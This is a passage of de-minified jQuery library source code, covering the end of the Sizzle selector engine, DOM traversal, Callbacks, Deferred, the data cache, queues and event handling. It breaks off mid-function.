            u && ((p = !m && p) && g--, e && j.push(p))
          }
          if (g += v, u && v !== g) {
            for (y = 0; m = o[y++];) m(j, Q, t, n);
            if (e) {
              if (g > 0)
                for (; v--;) j[v] || Q[v] || (Q[v] = k.call(a));
              Q = Qe(Q)
            }
            P.apply(a, Q), c && !e && Q.length > 0 && g + o.length > 1 && oe.uniqueSort(a)
          }
          return c && (w = T, l = x), j
        }, u ? ue(c) : c))).selector = e
      }
      return m
    }, s = oe.select = function (e, t, n, i) {
      var o, s, l, c, p, d = "function" == typeof e && e,
        f = !i && a(e = d.selector || e);
      if (n = n || [], 1 === f.length) {
        if ((s = f[0] = f[0].slice(0)).length > 2 && "ID" === (l = s[0]).type && 9 === t.nodeType && h && r.relative[s[1].type]) {
          if (!(t = (r.find.ID(l.matches[0].replace(Z, ee), t) || [])[0])) return n;
          d && (t = t.parentNode), e = e.slice(s.shift().value.length)
        }
        for (o = X.needsContext.test(e) ? 0 : s.length; o-- && (l = s[o], !r.relative[c = l.type]);)
          if ((p = r.find[c]) && (i = p(l.matches[0].replace(Z, ee), K.test(s[0].type) && he(t.parentNode) || t))) {
            if (s.splice(o, 1), !(e = i.length && ge(s))) return P.apply(n, i), n;
            break
          }
      }
      return (d || u(e, f))(i, t, !h, n, !t || K.test(e) && he(t.parentNode) || t), n
    }, n.sortStable = Q.split("").sort(A).join("") === Q, n.detectDuplicates = !!p, d(), n.sortDetached = se(function (e) {
      return 1 & e.compareDocumentPosition(f.createElement("fieldset"))
    }), se(function (e) {
      return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
    }) || le("type|href|height|width", function (e, t, n) {
      if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
    }), n.attributes && se(function (e) {
      return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
    }) || le("value", function (e, t, n) {
      if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue
    }), se(function (e) {
      return null == e.getAttribute("disabled")
    }) || le(L, function (e, t, n) {
      var r;
      if (!n) return !0 === e[t] ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null
    }), oe
  }(window);
  jQuery.find = Sizzle, jQuery.expr = Sizzle.selectors, jQuery.expr[":"] = jQuery.expr.pseudos, jQuery.uniqueSort = jQuery.unique = Sizzle.uniqueSort, jQuery.text = Sizzle.getText, jQuery.isXMLDoc = Sizzle.isXML, jQuery.contains = Sizzle.contains, jQuery.escapeSelector = Sizzle.escape;
  var dir = function (e, t, n) {
      for (var r = [], i = void 0 !== n;
        (e = e[t]) && 9 !== e.nodeType;)
        if (1 === e.nodeType) {
          if (i && jQuery(e).is(n)) break;
          r.push(e)
        } return r
    },
    siblings = function (e, t) {
      for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
      return n
    },
    rneedsContext = jQuery.expr.match.needsContext;

  function nodeName(e, t) {
    return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
  }
  var rsingleTag = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;

  function winnow(e, t, n) {
    return isFunction(t) ? jQuery.grep(e, function (e, r) {
      return !!t.call(e, r, e) !== n
    }) : t.nodeType ? jQuery.grep(e, function (e) {
      return e === t !== n
    }) : "string" != typeof t ? jQuery.grep(e, function (e) {
      return indexOf.call(t, e) > -1 !== n
    }) : jQuery.filter(t, e, n)
  }
  jQuery.filter = function (e, t, n) {
    var r = t[0];
    return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === r.nodeType ? jQuery.find.matchesSelector(r, e) ? [r] : [] : jQuery.find.matches(e, jQuery.grep(t, function (e) {
      return 1 === e.nodeType
    }))
  }, jQuery.fn.extend({
    find: function (e) {
      var t, n, r = this.length,
        i = this;
      if ("string" != typeof e) return this.pushStack(jQuery(e).filter(function () {
        for (t = 0; t < r; t++)
          if (jQuery.contains(i[t], this)) return !0
      }));
      for (n = this.pushStack([]), t = 0; t < r; t++) jQuery.find(e, i[t], n);
      return r > 1 ? jQuery.uniqueSort(n) : n
    },
    filter: function (e) {
      return this.pushStack(winnow(this, e || [], !1))
    },
    not: function (e) {
      return this.pushStack(winnow(this, e || [], !0))
    },
    is: function (e) {
      return !!winnow(this, "string" == typeof e && rneedsContext.test(e) ? jQuery(e) : e || [], !1).length
    }
  });
  var rootjQuery, rquickExpr = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/,
    init = jQuery.fn.init = function (e, t, n) {
      var r, i;
      if (!e) return this;
      if (n = n || rootjQuery, "string" == typeof e) {
        if (!(r = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : rquickExpr.exec(e)) || !r[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
        if (r[1]) {
          if (t = t instanceof jQuery ? t[0] : t, jQuery.merge(this, jQuery.parseHTML(r[1], t && t.nodeType ? t.ownerDocument || t : document, !0)), rsingleTag.test(r[1]) && jQuery.isPlainObject(t))
            for (r in t) isFunction(this[r]) ? this[r](t[r]) : this.attr(r, t[r]);
          return this
        }
        return (i = document.getElementById(r[2])) && (this[0] = i, this.length = 1), this
      }
      return e.nodeType ? (this[0] = e, this.length = 1, this) : isFunction(e) ? void 0 !== n.ready ? n.ready(e) : e(jQuery) : jQuery.makeArray(e, this)
    };
  init.prototype = jQuery.fn, rootjQuery = jQuery(document);
  var rparentsprev = /^(?:parents|prev(?:Until|All))/,
    guaranteedUnique = {
      children: !0,
      contents: !0,
      next: !0,
      prev: !0
    };

  function sibling(e, t) {
    for (;
      (e = e[t]) && 1 !== e.nodeType;);
    return e
  }
  jQuery.fn.extend({
    has: function (e) {
      var t = jQuery(e, this),
        n = t.length;
      return this.filter(function () {
        for (var e = 0; e < n; e++)
          if (jQuery.contains(this, t[e])) return !0
      })
    },
    closest: function (e, t) {
      var n, r = 0,
        i = this.length,
        o = [],
        a = "string" != typeof e && jQuery(e);
      if (!rneedsContext.test(e))
        for (; r < i; r++)
          for (n = this[r]; n && n !== t; n = n.parentNode)
            if (n.nodeType < 11 && (a ? a.index(n) > -1 : 1 === n.nodeType && jQuery.find.matchesSelector(n, e))) {
              o.push(n);
              break
            } return this.pushStack(o.length > 1 ? jQuery.uniqueSort(o) : o)
    },
    index: function (e) {
      return e ? "string" == typeof e ? indexOf.call(jQuery(e), this[0]) : indexOf.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
    },
    add: function (e, t) {
      return this.pushStack(jQuery.uniqueSort(jQuery.merge(this.get(), jQuery(e, t))))
    },
    addBack: function (e) {
      return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
    }
  }), jQuery.each({
    parent: function (e) {
      var t = e.parentNode;
      return t && 11 !== t.nodeType ? t : null
    },
    parents: function (e) {
      return dir(e, "parentNode")
    },
    parentsUntil: function (e, t, n) {
      return dir(e, "parentNode", n)
    },
    next: function (e) {
      return sibling(e, "nextSibling")
    },
    prev: function (e) {
      return sibling(e, "previousSibling")
    },
    nextAll: function (e) {
      return dir(e, "nextSibling")
    },
    prevAll: function (e) {
      return dir(e, "previousSibling")
    },
    nextUntil: function (e, t, n) {
      return dir(e, "nextSibling", n)
    },
    prevUntil: function (e, t, n) {
      return dir(e, "previousSibling", n)
    },
    siblings: function (e) {
      return siblings((e.parentNode || {}).firstChild, e)
    },
    children: function (e) {
      return siblings(e.firstChild)
    },
    contents: function (e) {
      return nodeName(e, "iframe") ? e.contentDocument : (nodeName(e, "template") && (e = e.content || e), jQuery.merge([], e.childNodes))
    }
  }, function (e, t) {
    jQuery.fn[e] = function (n, r) {
      var i = jQuery.map(this, t, n);
      return "Until" !== e.slice(-5) && (r = n), r && "string" == typeof r && (i = jQuery.filter(r, i)), this.length > 1 && (guaranteedUnique[e] || jQuery.uniqueSort(i), rparentsprev.test(e) && i.reverse()), this.pushStack(i)
    }
  });
  var rnothtmlwhite = /[^\x20\t\r\n\f]+/g;

  function createOptions(e) {
    var t = {};
    return jQuery.each(e.match(rnothtmlwhite) || [], function (e, n) {
      t[n] = !0
    }), t
  }

  function Identity(e) {
    return e
  }

  function Thrower(e) {
    throw e
  }

  function adoptValue(e, t, n, r) {
    var i;
    try {
      e && isFunction(i = e.promise) ? i.call(e).done(t).fail(n) : e && isFunction(i = e.then) ? i.call(e, t, n) : t.apply(void 0, [e].slice(r))
    } catch (e) {
      n.apply(void 0, [e])
    }
  }
  jQuery.Callbacks = function (e) {
    e = "string" == typeof e ? createOptions(e) : jQuery.extend({}, e);
    var t, n, r, i, o = [],
      a = [],
      u = -1,
      s = function () {
        for (i = i || e.once, r = t = !0; a.length; u = -1)
          for (n = a.shift(); ++u < o.length;) !1 === o[u].apply(n[0], n[1]) && e.stopOnFalse && (u = o.length, n = !1);
        e.memory || (n = !1), t = !1, i && (o = n ? [] : "")
      },
      l = {
        add: function () {
          return o && (n && !t && (u = o.length - 1, a.push(n)), function t(n) {
            jQuery.each(n, function (n, r) {
              isFunction(r) ? e.unique && l.has(r) || o.push(r) : r && r.length && "string" !== toType(r) && t(r)
            })
          }(arguments), n && !t && s()), this
        },
        remove: function () {
          return jQuery.each(arguments, function (e, t) {
            for (var n;
              (n = jQuery.inArray(t, o, n)) > -1;) o.splice(n, 1), n <= u && u--
          }), this
        },
        has: function (e) {
          return e ? jQuery.inArray(e, o) > -1 : o.length > 0
        },
        empty: function () {
          return o && (o = []), this
        },
        disable: function () {
          return i = a = [], o = n = "", this
        },
        disabled: function () {
          return !o
        },
        lock: function () {
          return i = a = [], n || t || (o = n = ""), this
        },
        locked: function () {
          return !!i
        },
        fireWith: function (e, n) {
          return i || (n = [e, (n = n || []).slice ? n.slice() : n], a.push(n), t || s()), this
        },
        fire: function () {
          return l.fireWith(this, arguments), this
        },
        fired: function () {
          return !!r
        }
      };
    return l
  }, jQuery.extend({
    Deferred: function (e) {
      var t = [
          ["notify", "progress", jQuery.Callbacks("memory"), jQuery.Callbacks("memory"), 2],
          ["resolve", "done", jQuery.Callbacks("once memory"), jQuery.Callbacks("once memory"), 0, "resolved"],
          ["reject", "fail", jQuery.Callbacks("once memory"), jQuery.Callbacks("once memory"), 1, "rejected"]
        ],
        n = "pending",
        r = {
          state: function () {
            return n
          },
          always: function () {
            return i.done(arguments).fail(arguments), this
          },
          catch: function (e) {
            return r.then(null, e)
          },
          pipe: function () {
            var e = arguments;
            return jQuery.Deferred(function (n) {
              jQuery.each(t, function (t, r) {
                var o = isFunction(e[r[4]]) && e[r[4]];
                i[r[1]](function () {
                  var e = o && o.apply(this, arguments);
                  e && isFunction(e.promise) ? e.promise().progress(n.notify).done(n.resolve).fail(n.reject) : n[r[0] + "With"](this, o ? [e] : arguments)
                })
              }), e = null
            }).promise()
          },
          then: function (e, n, r) {
            var i = 0;

            function o(e, t, n, r) {
              return function () {
                var a = this,
                  u = arguments,
                  s = function () {
                    var s, l;
                    if (!(e < i)) {
                      if ((s = n.apply(a, u)) === t.promise()) throw new TypeError("Thenable self-resolution");
                      l = s && ("object" == typeof s || "function" == typeof s) && s.then, isFunction(l) ? r ? l.call(s, o(i, t, Identity, r), o(i, t, Thrower, r)) : (i++, l.call(s, o(i, t, Identity, r), o(i, t, Thrower, r), o(i, t, Identity, t.notifyWith))) : (n !== Identity && (a = void 0, u = [s]), (r || t.resolveWith)(a, u))
                    }
                  },
                  l = r ? s : function () {
                    try {
                      s()
                    } catch (r) {
                      jQuery.Deferred.exceptionHook && jQuery.Deferred.exceptionHook(r, l.stackTrace), e + 1 >= i && (n !== Thrower && (a = void 0, u = [r]), t.rejectWith(a, u))
                    }
                  };
                e ? l() : (jQuery.Deferred.getStackHook && (l.stackTrace = jQuery.Deferred.getStackHook()), window.setTimeout(l))
              }
            }
            return jQuery.Deferred(function (i) {
              t[0][3].add(o(0, i, isFunction(r) ? r : Identity, i.notifyWith)), t[1][3].add(o(0, i, isFunction(e) ? e : Identity)), t[2][3].add(o(0, i, isFunction(n) ? n : Thrower))
            }).promise()
          },
          promise: function (e) {
            return null != e ? jQuery.extend(e, r) : r
          }
        },
        i = {};
      return jQuery.each(t, function (e, o) {
        var a = o[2],
          u = o[5];
        r[o[1]] = a.add, u && a.add(function () {
          n = u
        }, t[3 - e][2].disable, t[3 - e][3].disable, t[0][2].lock, t[0][3].lock), a.add(o[3].fire), i[o[0]] = function () {
          return i[o[0] + "With"](this === i ? void 0 : this, arguments), this
        }, i[o[0] + "With"] = a.fireWith
      }), r.promise(i), e && e.call(i, i), i
    },
    when: function (e) {
      var t = arguments.length,
        n = t,
        r = Array(n),
        i = slice.call(arguments),
        o = jQuery.Deferred(),
        a = function (e) {
          return function (n) {
            r[e] = this, i[e] = arguments.length > 1 ? slice.call(arguments) : n, --t || o.resolveWith(r, i)
          }
        };
      if (t <= 1 && (adoptValue(e, o.done(a(n)).resolve, o.reject, !t), "pending" === o.state() || isFunction(i[n] && i[n].then))) return o.then();
      for (; n--;) adoptValue(i[n], a(n), o.reject);
      return o.promise()
    }
  });
  var rerrorNames = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
  jQuery.Deferred.exceptionHook = function (e, t) {
    window.console && window.console.warn && e && rerrorNames.test(e.name) && window.console.warn("jQuery.Deferred exception: " + e.message, e.stack, t)
  }, jQuery.readyException = function (e) {
    window.setTimeout(function () {
      throw e
    })
  };
  var readyList = jQuery.Deferred();

  function completed() {
    document.removeEventListener("DOMContentLoaded", completed), window.removeEventListener("load", completed), jQuery.ready()
  }
  jQuery.fn.ready = function (e) {
    return readyList.then(e).catch(function (e) {
      jQuery.readyException(e)
    }), this
  }, jQuery.extend({
    isReady: !1,
    readyWait: 1,
    ready: function (e) {
      (!0 === e ? --jQuery.readyWait : jQuery.isReady) || (jQuery.isReady = !0, !0 !== e && --jQuery.readyWait > 0 || readyList.resolveWith(document, [jQuery]))
    }
  }), jQuery.ready.then = readyList.then, "complete" === document.readyState || "loading" !== document.readyState && !document.documentElement.doScroll ? window.setTimeout(jQuery.ready) : (document.addEventListener("DOMContentLoaded", completed), window.addEventListener("load", completed));
  var access = function (e, t, n, r, i, o, a) {
      var u = 0,
        s = e.length,
        l = null == n;
      if ("object" === toType(n)) {
        i = !0;
        for (u in n) access(e, t, u, n[u], !0, o, a)
      } else if (void 0 !== r && (i = !0, isFunction(r) || (a = !0), l && (a ? (t.call(e, r), t = null) : (l = t, t = function (e, t, n) {
          return l.call(jQuery(e), n)
        })), t))
        for (; u < s; u++) t(e[u], n, a ? r : r.call(e[u], u, t(e[u], n)));
      return i ? e : l ? t.call(e) : s ? t(e[0], n) : o
    },
    rmsPrefix = /^-ms-/,
    rdashAlpha = /-([a-z])/g;

  function fcamelCase(e, t) {
    return t.toUpperCase()
  }

  function camelCase(e) {
    return e.replace(rmsPrefix, "ms-").replace(rdashAlpha, fcamelCase)
  }
  var acceptData = function (e) {
    return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType
  };

  function Data() {
    this.expando = jQuery.expando + Data.uid++
  }
  Data.uid = 1, Data.prototype = {
    cache: function (e) {
      var t = e[this.expando];
      return t || (t = {}, acceptData(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
        value: t,
        configurable: !0
      }))), t
    },
    set: function (e, t, n) {
      var r, i = this.cache(e);
      if ("string" == typeof t) i[camelCase(t)] = n;
      else
        for (r in t) i[camelCase(r)] = t[r];
      return i
    },
    get: function (e, t) {
      return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][camelCase(t)]
    },
    access: function (e, t, n) {
      return void 0 === t || t && "string" == typeof t && void 0 === n ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t)
    },
    remove: function (e, t) {
      var n, r = e[this.expando];
      if (void 0 !== r) {
        if (void 0 !== t) {
          n = (t = Array.isArray(t) ? t.map(camelCase) : (t = camelCase(t)) in r ? [t] : t.match(rnothtmlwhite) || []).length;
          for (; n--;) delete r[t[n]]
        }(void 0 === t || jQuery.isEmptyObject(r)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando])
      }
    },
    hasData: function (e) {
      var t = e[this.expando];
      return void 0 !== t && !jQuery.isEmptyObject(t)
    }
  };
  var dataPriv = new Data,
    dataUser = new Data,
    rbrace = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
    rmultiDash = /[A-Z]/g;

  function getData(e) {
    return "true" === e || "false" !== e && ("null" === e ? null : e === +e + "" ? +e : rbrace.test(e) ? JSON.parse(e) : e)
  }

  function dataAttr(e, t, n) {
    var r;
    if (void 0 === n && 1 === e.nodeType)
      if (r = "data-" + t.replace(rmultiDash, "-$&").toLowerCase(), "string" == typeof (n = e.getAttribute(r))) {
        try {
          n = getData(n)
        } catch (e) {}
        dataUser.set(e, t, n)
      } else n = void 0;
    return n
  }
  jQuery.extend({
    hasData: function (e) {
      return dataUser.hasData(e) || dataPriv.hasData(e)
    },
    data: function (e, t, n) {
      return dataUser.access(e, t, n)
    },
    removeData: function (e, t) {
      dataUser.remove(e, t)
    },
    _data: function (e, t, n) {
      return dataPriv.access(e, t, n)
    },
    _removeData: function (e, t) {
      dataPriv.remove(e, t)
    }
  }), jQuery.fn.extend({
    data: function (e, t) {
      var n, r, i, o = this[0],
        a = o && o.attributes;
      if (void 0 === e) {
        if (this.length && (i = dataUser.get(o), 1 === o.nodeType && !dataPriv.get(o, "hasDataAttrs"))) {
          for (n = a.length; n--;) a[n] && 0 === (r = a[n].name).indexOf("data-") && (r = camelCase(r.slice(5)), dataAttr(o, r, i[r]));
          dataPriv.set(o, "hasDataAttrs", !0)
        }
        return i
      }
      return "object" == typeof e ? this.each(function () {
        dataUser.set(this, e)
      }) : access(this, function (t) {
        var n;
        if (o && void 0 === t) return void 0 !== (n = dataUser.get(o, e)) ? n : void 0 !== (n = dataAttr(o, e)) ? n : void 0;
        this.each(function () {
          dataUser.set(this, e, t)
        })
      }, null, t, arguments.length > 1, null, !0)
    },
    removeData: function (e) {
      return this.each(function () {
        dataUser.remove(this, e)
      })
    }
  }), jQuery.extend({
    queue: function (e, t, n) {
      var r;
      if (e) return t = (t || "fx") + "queue", r = dataPriv.get(e, t), n && (!r || Array.isArray(n) ? r = dataPriv.access(e, t, jQuery.makeArray(n)) : r.push(n)), r || []
    },
    dequeue: function (e, t) {
      t = t || "fx";
      var n = jQuery.queue(e, t),
        r = n.length,
        i = n.shift(),
        o = jQuery._queueHooks(e, t);
      "inprogress" === i && (i = n.shift(), r--), i && ("fx" === t && n.unshift("inprogress"), delete o.stop, i.call(e, function () {
        jQuery.dequeue(e, t)
      }, o)), !r && o && o.empty.fire()
    },
    _queueHooks: function (e, t) {
      var n = t + "queueHooks";
      return dataPriv.get(e, n) || dataPriv.access(e, n, {
        empty: jQuery.Callbacks("once memory").add(function () {
          dataPriv.remove(e, [t + "queue", n])
        })
      })
    }
  }), jQuery.fn.extend({
    queue: function (e, t) {
      var n = 2;
      return "string" != typeof e && (t = e, e = "fx", n--), arguments.length < n ? jQuery.queue(this[0], e) : void 0 === t ? this : this.each(function () {
        var n = jQuery.queue(this, e, t);
        jQuery._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && jQuery.dequeue(this, e)
      })
    },
    dequeue: function (e) {
      return this.each(function () {
        jQuery.dequeue(this, e)
      })
    },
    clearQueue: function (e) {
      return this.queue(e || "fx", [])
    },
    promise: function (e, t) {
      var n, r = 1,
        i = jQuery.Deferred(),
        o = this,
        a = this.length,
        u = function () {
          --r || i.resolveWith(o, [o])
        };
      for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; a--;)(n = dataPriv.get(o[a], e + "queueHooks")) && n.empty && (r++, n.empty.add(u));
      return u(), i.promise(t)
    }
  });
  var pnum = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
    rcssNum = new RegExp("^(?:([+-])=|)(" + pnum + ")([a-z%]*)$", "i"),
    cssExpand = ["Top", "Right", "Bottom", "Left"],
    isHiddenWithinTree = function (e, t) {
      return "none" === (e = t || e).style.display || "" === e.style.display && jQuery.contains(e.ownerDocument, e) && "none" === jQuery.css(e, "display")
    },
    swap = function (e, t, n, r) {
      var i, o, a = {};
      for (o in t) a[o] = e.style[o], e.style[o] = t[o];
      i = n.apply(e, r || []);
      for (o in t) e.style[o] = a[o];
      return i
    };

  function adjustCSS(e, t, n, r) {
    var i, o, a = 20,
      u = r ? function () {
        return r.cur()
      } : function () {
        return jQuery.css(e, t, "")
      },
      s = u(),
      l = n && n[3] || (jQuery.cssNumber[t] ? "" : "px"),
      c = (jQuery.cssNumber[t] || "px" !== l && +s) && rcssNum.exec(jQuery.css(e, t));
    if (c && c[3] !== l) {
      for (s /= 2, l = l || c[3], c = +s || 1; a--;) jQuery.style(e, t, c + l), (1 - o) * (1 - (o = u() / s || .5)) <= 0 && (a = 0), c /= o;
      c *= 2, jQuery.style(e, t, c + l), n = n || []
    }
    return n && (c = +c || +s || 0, i = n[1] ? c + (n[1] + 1) * n[2] : +n[2], r && (r.unit = l, r.start = c, r.end = i)), i
  }
  var defaultDisplayMap = {};

  function getDefaultDisplay(e) {
    var t, n = e.ownerDocument,
      r = e.nodeName,
      i = defaultDisplayMap[r];
    return i || (t = n.body.appendChild(n.createElement(r)), i = jQuery.css(t, "display"), t.parentNode.removeChild(t), "none" === i && (i = "block"), defaultDisplayMap[r] = i, i)
  }

  function showHide(e, t) {
    for (var n, r, i = [], o = 0, a = e.length; o < a; o++)(r = e[o]).style && (n = r.style.display, t ? ("none" === n && (i[o] = dataPriv.get(r, "display") || null, i[o] || (r.style.display = "")), "" === r.style.display && isHiddenWithinTree(r) && (i[o] = getDefaultDisplay(r))) : "none" !== n && (i[o] = "none", dataPriv.set(r, "display", n)));
    for (o = 0; o < a; o++) null != i[o] && (e[o].style.display = i[o]);
    return e
  }
  jQuery.fn.extend({
    show: function () {
      return showHide(this, !0)
    },
    hide: function () {
      return showHide(this)
    },
    toggle: function (e) {
      return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function () {
        isHiddenWithinTree(this) ? jQuery(this).show() : jQuery(this).hide()
      })
    }
  });
  var rcheckableType = /^(?:checkbox|radio)$/i,
    rtagName = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i,
    rscriptType = /^$|^module$|\/(?:java|ecma)script/i,
    wrapMap = {
      option: [1, "<select multiple='multiple'>", "</select>"],
      thead: [1, "<table>", "</table>"],
      col: [2, "<table><colgroup>", "</colgroup></table>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
      _default: [0, "", ""]
    };

  function getAll(e, t) {
    var n;
    return n = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && nodeName(e, t) ? jQuery.merge([e], n) : n
  }

  function setGlobalEval(e, t) {
    for (var n = 0, r = e.length; n < r; n++) dataPriv.set(e[n], "globalEval", !t || dataPriv.get(t[n], "globalEval"))
  }
  wrapMap.optgroup = wrapMap.option, wrapMap.tbody = wrapMap.tfoot = wrapMap.colgroup = wrapMap.caption = wrapMap.thead, wrapMap.th = wrapMap.td;
  var rhtml = /<|&#?\w+;/,
    Oo, Po;

  function buildFragment(e, t, n, r, i) {
    for (var o, a, u, s, l, c, p = t.createDocumentFragment(), d = [], f = 0, y = e.length; f < y; f++)
      if ((o = e[f]) || 0 === o)
        if ("object" === toType(o)) jQuery.merge(d, o.nodeType ? [o] : o);
        else if (rhtml.test(o)) {
      for (a = a || p.appendChild(t.createElement("div")), u = (rtagName.exec(o) || ["", ""])[1].toLowerCase(), s = wrapMap[u] || wrapMap._default, a.innerHTML = s[1] + jQuery.htmlPrefilter(o) + s[2], c = s[0]; c--;) a = a.lastChild;
      jQuery.merge(d, a.childNodes), (a = p.firstChild).textContent = ""
    } else d.push(t.createTextNode(o));
    for (p.textContent = "", f = 0; o = d[f++];)
      if (r && jQuery.inArray(o, r) > -1) i && i.push(o);
      else if (l = jQuery.contains(o.ownerDocument, o), a = getAll(p.appendChild(o), "script"), l && setGlobalEval(a), n)
      for (c = 0; o = a[c++];) rscriptType.test(o.type || "") && n.push(o);
    return p
  }
  Oo = document.createDocumentFragment().appendChild(document.createElement("div")), Po = document.createElement("input"), Po.setAttribute("type", "radio"), Po.setAttribute("checked", "checked"), Po.setAttribute("name", "t"), Oo.appendChild(Po), support.checkClone = Oo.cloneNode(!0).cloneNode(!0).lastChild.checked, Oo.innerHTML = "<textarea>x</textarea>", support.noCloneChecked = !!Oo.cloneNode(!0).lastChild.defaultValue;
  var documentElement = document.documentElement,
    rkeyEvent = /^key/,
    rmouseEvent = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
    rtypenamespace = /^([^.]*)(?:\.(.+)|)/;

  function returnTrue() {
    return !0
  }

  function returnFalse() {
    return !1
  }

  function safeActiveElement() {
    try {
      return document.activeElement
    } catch (e) {}
  }

  function on(e, t, n, r, i, o) {
    var a, u;
    if ("object" == typeof t) {
      "string" != typeof n && (r = r || n, n = void 0);
      for (u in t) on(e, u, n, r, t[u], o);
      return e
    }
    if (null == r && null == i ? (i = n, r = n = void 0) : null == i && ("string" == typeof n ? (i = r, r = void 0) : (i = r, r = n, n = void 0)), !1 === i) i = returnFalse;
    else if (!i) return e;
    return 1 === o && (a = i, (i = function (e) {
      return jQuery().off(e), a.apply(this, arguments)
    }).guid = a.guid || (a.guid = jQuery.guid++)), e.each(function () {
      jQuery.event.add(this, t, i, r, n)
    })
  }
  jQuery.event = {
    global: {},
    add: function (e, t, n, r, i) {
      var o, a, u, s, l, c, p, d, f, y, h, m = dataPriv.get(e);
      if (m)
        for (n.handler && (n = (o = n).handler, i = o.selector), i && jQuery.find.matchesSelector(documentElement, i), n.guid || (n.guid = jQuery.guid++), (s = m.events) || (s = m.events = {}), (a = m.handle) || (a = m.handle = function (t) {
            return void 0 !== jQuery && jQuery.event.triggered !== t.type ? jQuery.event.dispatch.apply(e, arguments) : void 0
          }), l = (t = (t || "").match(rnothtmlwhite) || [""]).length; l--;) f = h = (u = rtypenamespace.exec(t[l]) || [])[1], y = (u[2] || "").split(".").sort(), f && (p = jQuery.event.special[f] || {}, f = (i ? p.delegateType : p.bindType) || f, p = jQuery.event.special[f] || {}, c = jQuery.extend({
          type: f,
          origType: h,
          data: r,
          handler: n,
          guid: n.guid,
          selector: i,
          needsContext: i && jQuery.expr.match.needsContext.test(i),
          namespace: y.join(".")
        }, o), (d = s[f]) || ((d = s[f] = []).delegateCount = 0, p.setup && !1 !== p.setup.call(e, r, y, a) || e.addEventListener && e.addEventListener(f, a)), p.add && (p.add.call(e, c), c.handler.guid || (c.handler.guid = n.guid)), i ? d.splice(d.delegateCount++, 0, c) : d.push(c), jQuery.event.global[f] = !0)
    },
    remove: function (e, t, n, r, i) {
      var o, a, u, s, l, c, p, d, f, y, h, m = dataPriv.hasData(e) && dataPriv.get(e);
      if (m && (s = m.events)) {
        for (l = (t = (t || "").match(rnothtmlwhite) || [""]).length; l--;)
          if (f = h = (u = rtypenamespace.exec(t[l]) || [])[1], y = (u[2] || "").split(".").sort(), f) {
            for (p = jQuery.event.special[f] || {}, d = s[f = (r ? p.delegateType : p.bindType) || f] || [], u = u[2] && new RegExp("(^|\\.)" + y.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = o = d.length; o--;) c = d[o], !i && h !== c.origType || n && n.guid !== c.guid || u && !u.test(c.namespace) || r && r !== c.selector && ("**" !== r || !c.selector) || (d.splice(o, 1), c.selector && d.delegateCount--, p.remove && p.remove.call(e, c));
            a && !d.length && (p.teardown && !1 !== p.teardown.call(e, y, m.handle) || jQuery.removeEvent(e, f, m.handle), delete s[f])
          } else
            for (f in s) jQuery.event.remove(e, f + t[l], n, r, !0);
        jQuery.isEmptyObject(s) && dataPriv.remove(e, "handle events")
      }
    },
    dispatch: function (e) {
      var t, n, r, i, o, a, u = jQuery.event.fix(e),
        s = new Array(arguments.length),
        l = (dataPriv.get(this, "events") || {})[u.type] || [],
        c = jQuery.event.special[u.type] || {};
      for (s[0] = u, t = 1; t < arguments.length; t++) s[t] = arguments[t];
      if (u.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, u)) {
        for (a = jQuery.event.handlers.call(this, u, l), t = 0;
          (i = a[t++]) && !u.isPropagationStopped();)
          for (u.currentTarget = i.elem, n = 0;
            (o = i.handlers[n++]) && !u.isImmediatePropagationStopped();) u.rnamespace && !u.rnamespace.test(o.namespace) || (u.handleObj = o, u.data = o.data, void 0 !== (r = ((jQuery.event.special[o.origType] || {}).handle || o.handler).apply(i.elem, s)) && !1 === (u.result = r) && (u.preventDefault(), u.stopPropagation()));
        return c.postDispatch && c.postDispatch.call(this, u), u.result
      }
    },
    handlers: function (e, t) {
      var n, r, i, o, a, u = [],
        s = t.delegateCount,
        l = e.target;
      if (s && l.nodeType && !("click" === e.type && e.button >= 1))
        for (; l !== this; l = l.parentNode || this)
          if (1 === l.nodeType && ("click" !== e.type || !0 !== l.disabled)) {
            for (o = [], a = {}, n = 0; n < s; n++) void 0 === a[i = (r = t[n]).selector + " "] && (a[i] = r.needsContext ? jQuery(i, this).index(l) > -1 : jQuery.find(i, this, null, [l]).length), a[i] && o.push(r);
            o.length && u.push({
              elem: l,
              handlers: o
            })
          } return l = this, s < t.length && u.push({
        elem: l,
        handlers: t.slice(s)
      }), u
    },
    addProp: function (e, t) {
      Object.defineProperty(jQuery.Event.prototype, e, {
        enumerable: !0,
        configurable: !0,
        get: isFunction(t) ? function () {
